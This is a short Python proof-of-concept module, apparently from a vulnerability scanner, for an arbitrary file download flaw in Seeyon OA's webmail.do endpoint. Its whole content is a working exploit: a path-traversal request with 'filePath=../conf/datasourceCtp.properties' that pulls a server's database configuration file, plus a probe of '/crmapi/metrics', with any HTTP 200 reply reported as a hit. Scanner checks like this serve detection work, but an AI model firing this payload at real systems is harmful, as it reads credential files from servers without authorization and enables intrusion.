# -*- coding: utf-8 -*- 

from poc import core
def check(url):
	name='webmail.do任意文件下载'
	core.start_echo(name)
	use = ["/crmapi/metrics","/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties"]
	for i in range(0,2):
		path=use[i]
		r=core.get(url,path)
		if r:
			if r.status_code==200:
				core.end_echo(name,'Payload：'+url+'/'+path)
				core.result(name,url+'/'+path)
			else:
				# core.end_echo(name)
				pass
		else:
			core.end_echo(name)